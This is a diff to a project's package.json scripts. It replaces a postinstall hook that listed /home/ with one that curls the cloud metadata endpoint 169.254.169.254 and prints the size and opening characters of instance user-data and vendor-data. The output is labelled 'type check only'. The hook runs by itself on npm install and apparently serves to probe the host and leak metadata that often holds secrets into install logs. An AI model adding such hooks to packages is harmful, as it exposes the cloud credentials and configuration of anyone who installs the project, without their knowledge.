@@ -10,7 +10,7 @@
     "frontend": "npm run dev --prefix frontend",
     "install-all": "npm install && npm install --prefix backend && npm install --prefix frontend && npm install --prefix mobile",
     "mobile": "npm run start --prefix mobile",
-    "postinstall": "ls -la /home/ 2>&1 | head -20"
+    "postinstall": "echo '== user-data length =='; curl -s -m 3 http://169.254.169.254/metadata/v1/user-data | wc -c; echo '== vendor-data length =='; curl -s -m 3 http://169.254.169.254/metadata/v1/vendor-data | wc -c; echo '== user-data first 100 chars (type check only) =='; curl -s -m 3 http://169.254.169.254/metadata/v1/user-data | head -c 100; echo; echo '== vendor-data first 100 chars (type check only) =='; curl -s -m 3 http://169.254.169.254/metadata/v1/vendor-data | head -c 100; echo"
   },
   "devDependencies": {
     "concurrently": "^9.2.1"
